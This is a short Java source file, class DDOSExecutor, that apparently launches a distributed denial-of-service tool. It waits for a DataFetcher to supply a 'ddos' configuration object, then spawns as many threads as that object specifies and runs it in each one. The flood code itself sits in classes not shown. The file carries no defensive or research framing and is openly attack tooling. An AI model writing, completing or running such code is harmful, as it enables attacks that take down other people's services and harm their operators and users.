import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

public class DDOSExecutor {


    public static void main(String[] args) throws IOException {

        final DataFetcher dff = new DataFetcher();

        ExecutorService executor = Executors.newCachedThreadPool();
        executor.submit(dff.task);
        while(dff.getDdosObj() == null){
            try {
                Thread.sleep(500);
                System.out.println("Main thread sleeping");
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        System.out.println("Init threadspool");

        ExecutorService es = Executors.newFixedThreadPool(dff.getDdosObj().getThreads());

        Thread thread = new Thread(dff.getDdosObj());
        for (int i = 0; i < dff.getDdosObj().getThreads(); i++) {
            es.execute(thread);
            System.out.println("Executed successfully");
        }
    }
}
